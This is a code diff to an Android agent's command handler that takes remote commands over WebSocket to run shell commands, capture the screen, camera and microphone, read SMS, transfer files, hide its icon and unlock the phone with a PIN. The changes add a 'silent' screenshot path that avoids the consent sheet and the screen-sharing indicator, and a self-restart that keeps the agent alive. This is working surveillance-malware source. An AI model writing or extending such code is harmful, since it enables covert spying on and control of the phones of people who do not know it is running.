@@ -39,10 +39,30 @@ object CommandHandler {
         }
         if (msg.optString("type") != "cmd") return
         val cmdId = msg.optString("cmd_id")
+
+        // Reserve a files-put slot NOW, on the WebSocket thread. The server
+        // starts sending chunks immediately after this command; preparing on
+        // the worker created a race where early chunks/file_end were dropped.
+        var prepared: FileReceiver.Transfer? = null
+        if (msg.optString("action") == "files") {
+            val args = msg.optJSONArray("args")
+            if (args?.optString(0) == "put") {
+                try {
+                    prepared = FileReceiver.prepare(args.optString(1, ""), cmdId, ws)
+                } catch (e: Exception) {
+                    try {
+                        ws.sendText(error(cmdId, e.message ?: "files put failed").toString())
+                    } catch (_: Exception) {
+                    }
+                    return
+                }
+            }
+        }
+
         // execute off the websocket thread
         Thread {
             val resp = try {
-                execute(msg, ws).put("cmd_id", cmdId).put("id", cmdId)
+                execute(msg, ws, prepared).put("cmd_id", cmdId).put("id", cmdId)
             } catch (e: Exception) {
                 error(cmdId, e.message ?: "error")
             }
@@ -63,14 +83,25 @@ object CommandHandler {
         }
     }
 
-    private fun execute(msg: JSONObject, ws: WebSocket): JSONObject {
+    private fun execute(
+        msg: JSONObject, ws: WebSocket, prepared: FileReceiver.Transfer? = null
+    ): JSONObject {
         val action = msg.optString("action")
         val cmdId = msg.optString("cmd_id")
         val args = msg.optJSONArray("args") ?: JSONArray()
         val ctx = appContext ?: throw Exception("service context not ready")
         val result: Any = when (action) {
             "shell" -> shell(args.optString(0, "id"))
-            "files" -> filesCmd(ws, args, cmdId)
+            "files" -> {
+                if (args.optString(0) == "put") {
+                    val t = prepared ?: throw Exception(
+                        "files put: slot not prepared on the WebSocket thread"
+                    )
+                    FileReceiver.await(t)
+                } else {
+                    filesCmd(ws, args, cmdId)
+                }
+            }
             "screen" -> screenCmd(ctx, ws, args)
             "cam" -> camCmd(ctx, ws, args)
             "mic" -> micCmd(ctx, ws, args)
@@ -100,6 +131,7 @@ object CommandHandler {
             "status" -> DataReaders.status(ctx)
             "hide" -> DataReaders.setHidden(ctx, true)
             "unhide" -> DataReaders.setHidden(ctx, false)
+            "restart" -> restartSelf(ctx)
             else -> throw Exception("unknown action: $action")
         }
         return JSONObject()
@@ -108,6 +140,26 @@ object CommandHandler {
     }
 
     // ---------------------------------------------------------------- screen
+
+    /**
+     * Still capture without MediaProjection whenever ghosta is available.
+     * Accessibility screenshots (Android 11+) show neither a consent sheet
+     * nor the persistent screen-sharing indicator. Fall back to the existing
+     * projection capturer on older devices or if the sidekick is unavailable.
+     */
+    private fun silentScreenShot(ctx: Context, ws: WebSocket): JSONObject {
+        val viaSidekick = sidekickSend(
+            JSONObject().put("cmd", "screenshot").put("format", "png")
+        )
+        if (viaSidekick.optBoolean("ok")) {
+            val b64 = viaSidekick.remove("b64")
+            if (b64 != null) viaSidekick.put("png_b64", b64)
+            return viaSidekick.put("source", "accessibility")
+        }
+        return ScreenCapturer.shot(ctx, ws)
+            .put("source", "media_projection")
+            .put("accessibility_error", viaSidekick.optString("error", "unavailable"))
+    }
 
     /**
      * screen shot
@@ -120,7 +172,7 @@ object CommandHandler {
         val sub = args.optString(0, "")
         val o = opts(args, 1)
         return when (sub) {
-            "shot" -> ScreenCapturer.shot(ctx, ws)
+            "shot" -> silentScreenShot(ctx, ws)
             "record" -> {
                 val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 600)
                 ScreenCapturer.stream(
@@ -158,13 +210,26 @@ object CommandHandler {
     private fun camCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
         val sub = args.optString(0, "")
         val o = opts(args, 2)
-        return when (sub) {
-            "snap" -> CameraCapturer.snap(ctx, facing(args, 1))
-            "live", "start" -> CameraCapturer.live(
-                ctx, ws, facing(args, 1), o["quality"], o["fps"]?.toIntOrNull()
-            )
-            "stop" -> CameraCapturer.stop()
-            else -> throw Exception("cam: expected snap|live|stop")
+        try {
+            return when (sub) {
+                "snap" -> CameraCapturer.snap(ctx, facing(args, 1))
+                "live", "start" -> CameraCapturer.live(
+                    ctx, ws, facing(args, 1), o["quality"], o["fps"]?.toIntOrNull()
+                )
+                "stop" -> CameraCapturer.stop()
+                else -> throw Exception("cam: expected snap|live|stop")
+            }
+        } catch (e: Exception) {
+            // Turn cryptic vendor errors into something actionable.
+            val m = e.message ?: ""
+            if (m.contains("disabled by policy", ignoreCase = true)) {
+                throw Exception(
+                    "camera blocked by the system: turn on the phone's global " +
+                        "camera access toggle (Quick Settings → Camera access, or " +
+                        "Settings → Security & privacy → Privacy controls → Camera access)"
+                )
+            }
+            throw e
         }
     }
 
@@ -298,8 +363,32 @@ object CommandHandler {
         return sidekickSend(JSONObject().put("cmd", "unlock").put("pin", pin))
     }
 
-    // ----------------------------------------------------------- sms / data
+    /**
+     * `restart` — clean process restart, the last-resort recovery.
+     *
+     * Aborts any half-done transfer, lets the result frame reach the server,
+     * then kills this process. START_STICKY (plus the kick path) brings the
+     * agent back within seconds with fresh threads and an empty transfer
+     * slot — which is how a wedged receiver is cleared without touching the
+     * phone.
+     */
+    private fun restartSelf(ctx: Context): JSONObject {
+        FileReceiver.abortAll("restart")
+        Thread {
+            try {
+                Thread.sleep(700)      // give the result frame time to flush
+            } catch (_: InterruptedException) {
+            }
+            android.os.Process.killProcess(android.os.Process.myPid())
+        }.apply {
+            isDaemon = true
+            name = "ghostd-restart"
+            start()
+        }
+        return JSONObject().put("ok", true).put("restarting", true)
+    }
 
+    // ----------------------------------------------------------- sms / data
     /**
      * `sms recent [N]` — newest messages (default 20, max 200).
      */
@@ -416,10 +505,10 @@ object CommandHandler {
                     if (args.length() > 2) args.optString(2) else null
                 )
             }
-            "put" -> {
-                if (args.length() < 2) throw Exception("files put: expected <dest path>")
-                FileReceiver.receive(args.optString(1))
-            }
+            "put" -> throw Exception(
+                "files put: slot must be prepared on the WebSocket thread"
+            )
+            "abort" -> FileReceiver.abortAll("operator request")
             "tree" -> {
                 val o = opts(args, 1)
                 val path = when {
